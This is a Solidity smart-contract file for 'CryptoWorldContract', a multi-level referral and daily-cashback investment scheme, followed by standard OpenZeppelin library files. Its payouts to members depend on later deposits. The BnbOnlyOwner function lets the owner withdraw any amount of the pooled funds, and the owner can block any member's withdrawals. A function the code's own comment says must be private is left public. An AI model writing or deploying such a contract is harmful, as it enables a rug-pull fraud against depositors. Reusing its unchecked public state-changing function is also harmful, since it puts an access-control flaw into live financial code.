// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
// import "hardhat/console.sol";

contract CryptoWorldContract is Ownable, ReentrancyGuard {
    uint256 countTotalParticipantes;
    uint16 maxPercentFidelity;
    uint8 percentualCashBack;
    uint256 minBonusFidelidade;
    address walletA;
    uint8 walletAPercent;
    address walletB;
    uint8 walletBPercent;
    uint8 totalFee;

    address callerSmartContract1;
    address callerSmartContract2;
    address callerSmartContract3;

    uint256 minValue;
    uint256 maxValue;
    uint256 cardValue;
    uint256 countEntradaCapital;
    uint16[] bonusLevel = new uint16[](10);
    uint16[] matchingBonus = new uint16[](10);


    struct Account {
        address accountAddress;
        address referrerAccount;
        uint256 entryDate;
        uint256 ultimoSaque;
        uint256 valorDepositado;
        uint256 valorDisponivelSaquePacoteAnterior;
        uint256 totalAcumuladoAReceber;
        uint256 bonusFidelidade;
        uint256 totalSacado;
        uint16 numeroDeIndicados;
        uint8[] level;
        uint256[] accumulatedValuePerLevel;
        bool banTargetAccount;
        bool matchingBonusActive;
        bool meetsRequirement;
        uint256 matchingBonusTime;
        uint8 meetsRequirementCount;
    }

    mapping(address => Account) accMapping;
    mapping(address => bool) accMappingExist;

    constructor() ReentrancyGuard() {
        bonusLevel[0] = 6;
        bonusLevel[1] = 3;
        bonusLevel[2] = 2;
        bonusLevel[3] = 1;
        bonusLevel[4] = 1;
        bonusLevel[5] = 1;
        bonusLevel[6] = 1;
        bonusLevel[7] = 1;
        bonusLevel[8] = 1;
        bonusLevel[9] = 1;

        matchingBonus[0] = 10;
        matchingBonus[1] = 6;
        matchingBonus[2] = 4;
        matchingBonus[3] = 3;
        matchingBonus[4] = 2;
        matchingBonus[5] = 1;
        matchingBonus[6] = 1;
        matchingBonus[7] = 1;
        matchingBonus[8] = 1;
        matchingBonus[9] = 1;

        _addStartSystem();
        minValue = 0.05 ether;
        maxValue = 1 ether;
        minBonusFidelidade = 1 ether;
        maxPercentFidelity = 500;
        percentualCashBack = 5;
        walletAPercent = 5;
        walletBPercent = 2;
        totalFee = walletAPercent + walletBPercent;
        cardValue = 0.5 ether;
    }

    function renounceOwnership() public virtual override onlyOwner {
        revert("RenounceOwnership: property cannot be surrendered");
    }

    function banTargetAccountAdd(address _address) public onlyOwner {
        accMapping[_address].banTargetAccount = true;
    }

    function banTargetAccountRemove(address _address) public onlyOwner {
        accMapping[_address].banTargetAccount = false;
    }

    function GetPaymentAccount() public view returns (address) {
        return accMapping[_msgSender()].accountAddress;
    }

    function SetPaymentAccount(address _address) public onlyOwner {
        accMapping[_msgSender()].accountAddress = _address;
    }

    function GetMaxPercentFidelity() public view returns (uint16) {
        return maxPercentFidelity;
    }

    function setMaxPercentFidelity(uint16 newMaxPercentFidelity) public onlyOwner {
        maxPercentFidelity = newMaxPercentFidelity;
    }

    function GetCardValue() public view returns (uint256) {
        return cardValue;
    }

    function setCardValue(uint256 newCardValue) public onlyOwner {
        cardValue = newCardValue;
    }

    function GetCaller1() public view returns (address) {
        return callerSmartContract1;
    }

    function setCaller1(address newCallerSmartContract1) public onlyOwner {
        callerSmartContract1 = newCallerSmartContract1;
    }

    function GetCaller2() public view returns (address) {
        return callerSmartContract2;
    }

    function setCaller2(address newCallerSmartContract2) public onlyOwner {
        callerSmartContract2 = newCallerSmartContract2;
    }

    function GetCaller3() public view returns (address) {
        return callerSmartContract3;
    }

    function setCaller3(address newCallerSmartContract3) public onlyOwner {
        callerSmartContract3 = newCallerSmartContract3;
    }

    function alterMatchingBonusActive(address accountAddress) public nonReentrant {
        address msgSender = _msgSender();
        require(msgSender == callerSmartContract1, "Chamada nao permitida a partir deste contrato");

        accMapping[accountAddress].matchingBonusActive = true;
        accMapping[accountAddress].matchingBonusTime = block.timestamp;
    }

    function alterTrueMatchingBonusActive(address accountAddress) public onlyOwner {
        accMapping[accountAddress].matchingBonusActive = true;
        accMapping[accountAddress].matchingBonusTime = block.timestamp;
    }

    function _alterFalseMatchingBonusActive(address accountAddress) private {
        accMapping[accountAddress].matchingBonusActive = false;
    }

    function alterMeetsRequirementCount(address accountAddress) public nonReentrant{
        address msgSender = _msgSender();
        require(msgSender == callerSmartContract2, "Chamada nao permitida a partir deste contrato");

        accMapping[accountAddress].meetsRequirementCount += 1;
    }

    function alterFalseMeetsRequirement(address accountAddress) public onlyOwner {
        accMapping[accountAddress].meetsRequirement = false;
    }

    function alterTrueMeetsRequirement(address accountAddress) public onlyOwner {
        accMapping[accountAddress].meetsRequirement = true;
    }

    function GetMinValue() public view returns (uint256) {
        return minValue;
    }

    function setMinValue(uint256 newMinValue) public onlyOwner {
        minValue = newMinValue;
    }

    function GetMaxValue() public view returns (uint256) {
        return maxValue;
    }

    function setMaxValue(uint256 newMaxValue) public onlyOwner {
        maxValue = newMaxValue;
    }

    function getMinBonusFidelidade() public view returns (uint256) {
        return minBonusFidelidade;
    }

    function setMinBonusFidelidade(uint256 NewMinBonusFidelidade) public onlyOwner {
        minBonusFidelidade = NewMinBonusFidelidade;
    }

    function GetPercentualCashBack() public view returns (uint8) {
        return percentualCashBack;
    }

    function setPercentualCashBack(uint8 newPercentualCashBack) public onlyOwner {
        percentualCashBack = newPercentualCashBack;
    }

    function setWalletA(address wallet, uint8 walletAPercentValue) external onlyOwner {
        walletA = wallet;
        walletAPercent = walletAPercentValue;
    }

    function setWalletB(address wallet, uint8 walletBPercentValue) external onlyOwner {
        walletB = wallet;
        walletBPercent = walletBPercentValue;
    }

    function joinTheGame(address _indicator) external payable {
        require(msg.value >= minValue, "Abaixo do minimo");
        require(msg.value <= maxValue, "Acima do maximo");
        require(accMappingExist[_indicator] && _indicator != address(0), "Esta carteira de indicador nao existe");

        if (!accMappingExist[_msgSender()]) {
            _addAccount(_indicator);
        } else {
            revert("Esta carteira ja existe no sistema");
        }
        _setLevelIndicador(_indicator);
        _distribuiComissoes(_indicator);
        _adicionaLevelAosNiveis(_indicator);

        countTotalParticipantes++;
    }

    function donation() public payable nonReentrant {
        require(msg.value > 0, "Valor invalido");
    }

    function donationWithCommission() public payable nonReentrant {
        require(msg.value > 0, "Valor invalido");
        uint256 fee = (msg.value / 100) * totalFee;
        _sendMoney(walletA, (fee / totalFee) * walletAPercent);
        _sendMoney(walletB, (fee / totalFee) * walletBPercent);
    }

    function _sendMoney(address to, uint256 value) private {
        address payable receiver = payable(to);
        receiver.transfer(value);
    }

    function withdraw() external nonReentrant {
        _withdraw(0);
    }

    function partialWithdraw(uint256 withdrawValue) external nonReentrant {
        _withdraw(withdrawValue);
    }

    function _withdraw(uint256 withdrawValue) private {
        address msgSender = _msgSender();

        require(accMappingExist[msgSender], "Conta nao registrada, portanto impossibilitade de fazer retiradas");
        
        if(accMapping[msgSender].meetsRequirement) {
            require(accMapping[msgSender].meetsRequirementCount >= accMapping[msgSender].valorDepositado / cardValue, 
                        "Numero insuficiente de cartelas adquiridas");
        }
        
        require(!accMapping[msgSender].banTargetAccount, "Sua conta esta temporariamente bloqueada");

        _gerarBonusCashBack();

        uint256 totalSacado = accMapping[msgSender].totalSacado;
        uint256 totalSacadoLiquido = totalSacado - ((totalSacado / 100) * totalFee);
        uint256 totalAcumuladoAReceber = accMapping[msgSender].totalAcumuladoAReceber;
        uint256 valorDisponivelSaquePacoteAnterior = accMapping[msgSender].valorDisponivelSaquePacoteAnterior;
        uint256 valorDisponivelSaquePacoteAnteriorLiquido = valorDisponivelSaquePacoteAnterior - ((valorDisponivelSaquePacoteAnterior / 100) * totalFee);

        uint256 tetoMaximo = _obtemTetoMaximo(accMapping[msgSender].valorDepositado, accMapping[msgSender].bonusFidelidade);

        uint256 valorATransferir;
        uint256 fee;
        uint256 valorTotalRecebivelLiquido = (tetoMaximo - ((tetoMaximo / 100) * totalFee));

        if (withdrawValue == 0) {
            valorATransferir = valorDisponivelSaquePacoteAnterior + totalAcumuladoAReceber;
            fee = (valorATransferir / 100) * totalFee;
            valorATransferir -= fee;
        } else {
            fee = (withdrawValue / 100) * totalFee;
            valorATransferir = withdrawValue - fee;
        }

        require(valorATransferir > 0, "Esta conta nao possui o valor disponivel para saque");

        require((valorATransferir + totalSacadoLiquido) 
                    <= valorTotalRecebivelLiquido + valorDisponivelSaquePacoteAnteriorLiquido, 
                        "Valor nao liberado, consulte o regulamento");

        require(valorATransferir <= valorTotalRecebivelLiquido + valorDisponivelSaquePacoteAnteriorLiquido, 
                    "Esta conta nao possui o valor disponivel para saque");


        if (withdrawValue == 0) {
            accMapping[msgSender].valorDisponivelSaquePacoteAnterior = 0;
            accMapping[msgSender].totalAcumuladoAReceber = 0;
        } else {
            if (valorATransferir + fee >= valorDisponivelSaquePacoteAnterior) {
                accMapping[msgSender].valorDisponivelSaquePacoteAnterior = 0;
                accMapping[msgSender].totalAcumuladoAReceber -= (valorATransferir + fee - valorDisponivelSaquePacoteAnterior);
            } else {
                accMapping[msgSender].valorDisponivelSaquePacoteAnterior -= valorATransferir + fee;
            }
        }
        accMapping[msgSender].totalSacado += valorATransferir + fee;

        _sendMoney(walletA, (fee / totalFee) * walletAPercent);
        _sendMoney(walletB, (fee / totalFee) * walletBPercent);

        accMapping[msgSender].meetsRequirementCount = 0;
        payable(accMapping[msgSender].accountAddress).transfer(valorATransferir);
    }

    function _gerarBonusCashBack() public {
        // NÃO ESQUECER DE DEIXAR ESTE MÉTODO COMO PRIVATE
        address msgSender = _msgSender();

        // só gerar cashback se ainda não tiver atingido o máximo
        uint totalSacado = accMapping[msgSender].totalSacado;
        uint256 cashBack = cashBackDisponivel(msgSender);
        uint256 tetoMaximo = _obtemTetoMaximo(accMapping[msgSender].valorDepositado, accMapping[msgSender].bonusFidelidade);
        uint256 totalObtido = totalSacado + accMapping[msgSender].totalAcumuladoAReceber + cashBack;

        if (totalObtido < tetoMaximo) {
            accMapping[msgSender].totalAcumuladoAReceber += cashBack;
        } else {
            accMapping[msgSender].totalAcumuladoAReceber = tetoMaximo - totalSacado;
        }
        accMapping[msgSender].ultimoSaque = block.timestamp;
    }

    function obterMinutosDecorridos(uint256 periodoInicio) public view returns (uint256 tempoPassadoEmSegundos) {
        uint256 periodoAtual = block.timestamp;
        tempoPassadoEmSegundos = (periodoAtual - periodoInicio);

        return tempoPassadoEmSegundos;
    }

    function cashBackDisponivel(address _address) private view returns (uint256 cashBackAtualDisponivel) {
        require(accMappingExist[_address], "Conta nao registrada");

        uint256 valorDepositado = accMapping[_address].valorDepositado;
        uint256 ultimoSaque = accMapping[_address].ultimoSaque;
        uint256 segundosTotaisDecorridos = obterMinutosDecorridos(ultimoSaque);
        uint256 rendimentoValorDepositadoPorSegundo = ((((valorDepositado * percentualCashBack) / 1000) / 24) / 60 / 60);

        cashBackAtualDisponivel = rendimentoValorDepositadoPorSegundo * segundosTotaisDecorridos;
        return cashBackAtualDisponivel;
    }

    function _valorLiquidoAReceber() private returns (uint256) {
        address msgSender = _msgSender();
        uint256 valorDepositado = accMapping[msgSender].valorDepositado;
        uint256 bonusFidelidade = accMapping[msgSender].bonusFidelidade;
        uint256 valorTotalRecebivelReturn = _obtemTetoMaximo(valorDepositado, bonusFidelidade);
        uint256 valorAReceber;
        uint256 totalAcumulado = accMapping[_msgSender()].totalAcumuladoAReceber;

        if (totalAcumulado < valorTotalRecebivelReturn) {
            accMapping[_msgSender()].totalAcumuladoAReceber -= totalAcumulado;
            accMapping[_msgSender()].totalSacado += totalAcumulado;
            valorAReceber = totalAcumulado;
        } else {
            accMapping[_msgSender()].totalAcumuladoAReceber -= valorTotalRecebivelReturn;
            accMapping[_msgSender()].totalSacado += valorTotalRecebivelReturn;
            valorAReceber = valorTotalRecebivelReturn;
        }
        uint256 valorReservadoParaJogos = (valorAReceber / 100) * 2;

        return valorAReceber - valorReservadoParaJogos;
    }

    function _valorTotalLiquidoRecebivel(uint256 valorDepositado, uint256 bonusFidelidade) private pure returns (uint256) {
        uint256 valorBruto = (valorDepositado / 100) * (200 + bonusFidelidade);
        uint256 valorBrutoDescontadoJogos = valorBruto - ((valorBruto / 100) * 2);

        return valorBrutoDescontadoJogos;
    }

    function _setLevelIndicador(address _indicator) private {
        if (accMapping[_indicator].numeroDeIndicados < bonusLevel.length) {
            accMapping[_indicator].numeroDeIndicados = accMapping[_indicator].numeroDeIndicados + 1;
        }
    }

    function setRenewAccount() external payable nonReentrant {
        address msgSender = _msgSender();

        require(accMappingExist[msgSender], "Renovacao apenas para carteiras integrantes");
        require(msg.value >= minValue, "Abaixo do minimo");
        require(msg.value <= maxValue, "Acima do maximo");

        uint256 tetoMaximo = _obtemTetoMaximo(accMapping[msgSender].valorDepositado, accMapping[msgSender].bonusFidelidade);
        uint256 totalObtido = accMapping[msgSender].totalSacado + accMapping[msgSender].totalAcumuladoAReceber + cashBackDisponivel(msgSender);

        require(tetoMaximo < totalObtido, "Possibilidade de renovacao a partir do teto atingido");

        uint256 saldoRemanescente = totalAReceber(msgSender);
        accMapping[msgSender].entryDate = block.timestamp;
        accMapping[msgSender].ultimoSaque = block.timestamp;
        accMapping[msgSender].totalSacado = 0;
        accMapping[msgSender].totalAcumuladoAReceber = 0;
        accMapping[msgSender].valorDisponivelSaquePacoteAnterior = 0;
        accMapping[msgSender].valorDisponivelSaquePacoteAnterior = saldoRemanescente;

        if (accMapping[msgSender].bonusFidelidade < maxPercentFidelity && msg.value >= minBonusFidelidade) {
            accMapping[msgSender].bonusFidelidade += 50;
        }
        accMapping[msgSender].valorDepositado = msg.value;
        _distribuiComissoes(accMapping[msgSender].referrerAccount);
    }

    function _distribuiComissoes(address _address) private {
        for (uint16 i = 0; i < bonusLevel.length; i++) {
            bool temDireitoAReceberComissao = _temDireitoAComissao(_address);

            if(!temDireitoAReceberComissao) {
                return;
            }

            matchingBonusTimeVerify(_address);
            
            if (temDireitoAReceberComissao) {
                if (accMapping[_address].numeroDeIndicados >= i + 1) {
                    uint256 valorBonusComissao = 0;
                    if (accMapping[_address].matchingBonusActive) {
                        valorBonusComissao = (msg.value / 100) * matchingBonus[i];
                    } else {
                        valorBonusComissao = (msg.value / 100) * bonusLevel[i];
                    }
                    
                    uint256 valorComissaoRecebivel = _retornaComissaoRecebivel(_address, valorBonusComissao);
                    accMapping[_address].totalAcumuladoAReceber += valorComissaoRecebivel;
                    accMapping[_address].accumulatedValuePerLevel[i] = accMapping[_address].accumulatedValuePerLevel[i] + valorComissaoRecebivel;
                }
                if (!accMappingExist[accMapping[_address].referrerAccount]) break;

                _address = accMapping[_address].referrerAccount;
            }
        }
    }

    function matchingBonusTimeVerify(address _address) private {
        uint256 today = block.timestamp;
        if((accMapping[_address].matchingBonusTime + 30 days) < today) {
            _alterFalseMatchingBonusActive(_address);
        }
    }

    function _temDireitoAComissao(address _indicador) private view returns (bool) {
        uint256 tetoMaximo = _obtemTetoMaximo(accMapping[_indicador].valorDepositado, accMapping[_indicador].bonusFidelidade);
        uint256 bonusCashBackAindaNaoRecebido = cashBackDisponivel(_indicador);

        return tetoMaximo > bonusCashBackAindaNaoRecebido + accMapping[_indicador].totalAcumuladoAReceber + accMapping[_indicador].totalSacado;
    }

    function _obtemTetoMaximo (uint256 valorDepositado, uint256 bonusFidelidade) public pure returns (uint256) {
        return (valorDepositado * (2000 + bonusFidelidade)) / 1000;
    }

    function _retornaComissaoRecebivel(address _indicador, uint256 valorComissao) private view returns (uint256) {
        uint256 valorDepositado = accMapping[_indicador].valorDepositado;
        uint256 bonusFidelidade = accMapping[_indicador].bonusFidelidade;
        uint256 totalSacado = accMapping[_indicador].totalSacado;
        uint256 totalAcumuladoAReceber = accMapping[_indicador].totalAcumuladoAReceber;
        uint256 tetoMaximo = _obtemTetoMaximo(valorDepositado, bonusFidelidade);
        uint256 bonusCashBackAindaNaoRecebido = cashBackDisponivel(_indicador);

        return
            tetoMaximo > bonusCashBackAindaNaoRecebido + totalAcumuladoAReceber + totalSacado + valorComissao
                ? valorComissao
                : bonusCashBackAindaNaoRecebido + totalAcumuladoAReceber + totalSacado + valorComissao == tetoMaximo
                ? 0
                : valorComissao - (bonusCashBackAindaNaoRecebido + totalAcumuladoAReceber + totalSacado + valorComissao - tetoMaximo);
    }

    function _adicionaLevelAosNiveis(address _indicator) private {
        for (uint16 i = 0; i < bonusLevel.length; i++) {
            accMapping[_indicator].level[i] += 1;
            if (accMapping[_indicator].referrerAccount == address(0)) {
                break;
            }
            _indicator = accMapping[_indicator].referrerAccount;
        }
    }

    function qdtAccontInGame() external view returns (uint256 totalParticipantes) {
        totalParticipantes = countTotalParticipantes;
    }

    function _addAccount(address _indicator) private {
        address msgSender = _msgSender();

        Account memory acc = Account({
            entryDate: block.timestamp,
            ultimoSaque: block.timestamp,
            accountAddress: msgSender,
            valorDepositado: msg.value,
            referrerAccount: _indicator,
            totalAcumuladoAReceber: 0,
            totalSacado: 0,
            bonusFidelidade: 0,
            numeroDeIndicados: 0,
            level: new uint8[](10),
            accumulatedValuePerLevel: new uint256[](10),
            valorDisponivelSaquePacoteAnterior: 0,
            banTargetAccount: false,
            matchingBonusActive: false,
            meetsRequirement: true,
            matchingBonusTime: 0,
            meetsRequirementCount: 0
        });

        accMapping[msgSender] = acc;
        accMappingExist[msgSender] = true;
    }

    function _addStartSystem() private {
        Account memory acc = Account({
            entryDate: block.timestamp,
            ultimoSaque: block.timestamp,
            accountAddress: 0xaec420dD346040a14071C450A8B0a13623C5759e,
            valorDepositado: 10 ether,
            referrerAccount: address(0),
            totalAcumuladoAReceber: 0,
            totalSacado: 0,
            bonusFidelidade: 0,
            numeroDeIndicados: 0,
            level: new uint8[](10),
            accumulatedValuePerLevel: new uint256[](10),
            valorDisponivelSaquePacoteAnterior: 0,
            banTargetAccount: false,
            matchingBonusActive: false,
            meetsRequirement: false,
            matchingBonusTime: 0,
            meetsRequirementCount: 0
        });
        acc.level[0] = 0;
        accMapping[0xaec420dD346040a14071C450A8B0a13623C5759e] = acc;
        accMappingExist[0xaec420dD346040a14071C450A8B0a13623C5759e] = true;
    }

    function getAccount(address _address)
        external
        view
        returns (
            uint256 entryDate,
            uint256 lastWithdrawal,
            uint256 depositedValue,
            address referrerAccount,
            uint256 totalAccumulatedReceive,
            uint256 totalDrawee,
            uint256 bonusLoyalty,
            uint256 valorDisponivelSaquePacoteAnterior,
            uint8[] memory level,
            uint256[] memory accumulatedValuePerLevel,
            bool matchingBonusActive,
            uint8 meetsRequirementCount
        )
    {
        Account memory acc = accMapping[_address];
        entryDate = acc.entryDate;
        lastWithdrawal = acc.ultimoSaque;
        depositedValue = acc.valorDepositado;
        referrerAccount = acc.referrerAccount;
        totalAccumulatedReceive = acc.totalAcumuladoAReceber;
        totalDrawee = acc.totalSacado;
        bonusLoyalty = acc.bonusFidelidade;
        level = acc.level;
        accumulatedValuePerLevel = acc.accumulatedValuePerLevel;
        matchingBonusActive = acc.matchingBonusActive;
        meetsRequirementCount = acc.meetsRequirementCount;
        valorDisponivelSaquePacoteAnterior = acc.valorDisponivelSaquePacoteAnterior;
    }

    function contrato() external view returns (uint256) {
        return address(this).balance;
    }

    function BnbOnlyOwner(uint256 value) external payable onlyOwner nonReentrant {
        _sendMoney(_msgSender(), value);
    }

    function totalAReceber(address _address) public view returns (uint256 totalAReceberLiquido) {
        uint256 cashBack = cashBackDisponivel(_address);
        totalAReceberLiquido = cashBack + accMapping[_address].totalAcumuladoAReceber + accMapping[_address].valorDisponivelSaquePacoteAnterior;

        return totalAReceberLiquido;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}